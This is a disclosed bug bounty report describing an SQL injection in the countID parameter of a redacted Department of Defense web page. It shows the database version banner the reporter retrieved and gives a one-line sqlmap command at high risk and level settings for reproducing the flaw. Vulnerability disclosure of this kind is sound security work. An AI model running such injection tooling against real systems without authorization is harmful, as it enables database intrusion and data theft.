# SQL Injection on www.██████████ on countID parameter

## Report Details
- **Report ID**: 390879
- **URL**: https://hackerone.com/reports/390879
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-08-06T12:03:16.573Z
- **Disclosed**: 2019-10-08T18:46:15.286Z

## Reporter
- **Username**: 0_1vitthal
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**
Hello Team,
I have came across a sql injection vulnerability on www.██████ on countID parameter. I was able to retrieve the banner which is

> Microsoft SQL Server 2008 R2 (SP3) - 10.50.6220.0 (X64& 
	Mar 19 2015 12:32:14 
	Copyright (c) Microsoft Corporation
	Standard Edition (64-bit) on Windows NT 6.3 <X64> (Build 9600: ) (Hypervisor)

after confirming the vulnerability i have stopped testing further.

**Vulnerable URL:**
https://www.███/public/saveCount.cfm?countID=4

**Steps to Reproduce:**
1. python sqlmap.py -u https://www.██████████/public/saveCount.cfm?countID=4 --level=3 --risk=3 

**POC**
█████████

## Impact

Attacker can take control over the database server.

## Attachments
No attachments
